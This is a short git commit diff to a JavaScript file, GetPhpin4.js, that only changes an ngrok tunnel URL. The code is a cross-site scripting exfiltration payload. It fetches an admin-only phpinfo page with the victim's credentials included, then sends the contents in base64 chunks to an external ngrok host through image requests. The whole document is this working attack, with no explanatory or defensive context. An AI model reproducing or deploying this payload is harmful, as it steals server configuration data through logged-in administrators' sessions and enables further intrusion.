1e57555cef355979b5c9432e71a7e0079c2a3914
glno815 <78334532+glno815@users.noreply.github.com>
2026-03-24 23:54:53 +0700

    Update GetPhpin4.js

--- GetPhpin4.js
+++ GetPhpin4.js
@@ -2,6 +2,6 @@ fetch('/admin/phpinfo.php',{credentials:'include'})
 .then(r=>r.text())
 .then(d=>{
   for(let i=0;i<d.length;i+=1000){
-    new Image().src="https://b5be-2402-800-61c7-539d-6be1-5c24-9cd9-8309.ngrok-free.app?step="+i+"&data="+encodeURIComponent(btoa(d.slice(i,i+1000)));
+    new Image().src="https://b984-2402-800-61c7-e3bb-f053-3732-a0c5-7b17.ngrok-free.app/?step="+i+"&data="+encodeURIComponent(btoa(d.slice(i,i+1000)));
   }
 });
